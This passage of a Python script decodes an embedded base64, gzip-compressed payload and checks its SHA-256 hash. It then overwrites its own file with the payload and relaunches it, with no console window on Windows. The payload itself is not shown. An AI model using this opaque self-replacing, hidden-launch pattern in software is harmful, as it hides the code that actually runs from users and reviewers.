"""

def main():
    target = Path(__file__).resolve()
    raw = gzip.decompress(base64.b64decode(_PAYLOAD.encode("ascii")))
    actual = hashlib.sha256(raw).hexdigest()
    if actual != _PAYLOAD_SHA256:
        raise RuntimeError("v5.5 payload checksum mismatch")

    tmp = target.with_suffix(".v55.tmp")
    tmp.write_bytes(raw)
    os.replace(tmp, target)

    kwargs = {"cwd": str(target.parent)}
    if os.name == "nt":
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    subprocess.Popen([sys.executable, str(target)], **kwargs)

if __name__ == "__main__":
    main()
